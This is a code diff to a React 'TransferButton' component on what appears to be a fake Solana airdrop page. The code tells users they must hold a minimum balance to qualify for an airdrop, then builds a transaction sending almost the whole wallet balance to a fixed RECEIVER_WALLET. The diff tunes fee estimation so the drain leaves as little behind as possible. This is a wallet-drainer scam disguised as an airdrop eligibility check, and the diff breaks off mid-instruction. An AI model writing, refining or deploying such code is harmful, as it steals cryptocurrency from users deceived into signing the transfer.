@@ -19,27 +19,43 @@ export default function TransferButton({ className = '' }) {
 
     setLoading(true);
     try {
-      const balance = await connection.getBalance(publicKey, 'confirmed');
+      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
+        connection.getBalance(publicKey, 'confirmed'),
+        connection.getLatestBlockhash('confirmed'),
+      ]);
+
       const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);
 
-      if (balance < minimumQualifyingLamports + TRANSFER_FEE_BUFFER) {
+      if (balance < minimumQualifyingLamports) {
         alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
         return;
       }
 
-      const transferAmount = balance - TRANSFER_FEE_BUFFER;
+      // Build a dummy transfer first to estimate the real fee
+      const dummyIx = SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: RECEIVER_WALLET,
+        lamports: 1, // placeholder
+      });
+
+      const dummyMsg = new TransactionMessage({
+        payerKey: publicKey,
+        recentBlockhash: blockhash,
+        instructions: [dummyIx],
+      }).compileToV0Message();
+
+      const feeResult = await connection.getFeeForMessage(dummyMsg, 'confirmed');
+      // Base fee from RPC + extra margin for priority fees the wallet may add
+      const baseFee = feeResult?.value ?? 5000;
+      const feeReserve = Math.max(baseFee * 4, TRANSFER_FEE_BUFFER);
+
+      const transferAmount = balance - feeReserve;
       if (transferAmount <= 0) {
         alert('Insufficient balance for transaction fee.');
         return;
       }
 
-      const { blockhash, lastValidBlockHeight } =
-        await connection.getLatestBlockhash('confirmed');
-
-      // Build a V0 VersionedTransaction — this is the native format that
-      // all Wallet Standard wallets (Phantom, Trust, Solflare, etc.) use
-      // internally for signAndSendTransaction.  Legacy Transaction objects
-      // can lose signatures during adapter conversion.
+      // Build the real transaction with the correct amount
       const instructions = [
         SystemProgram.transfer({
           fromPubkey: publicKey,
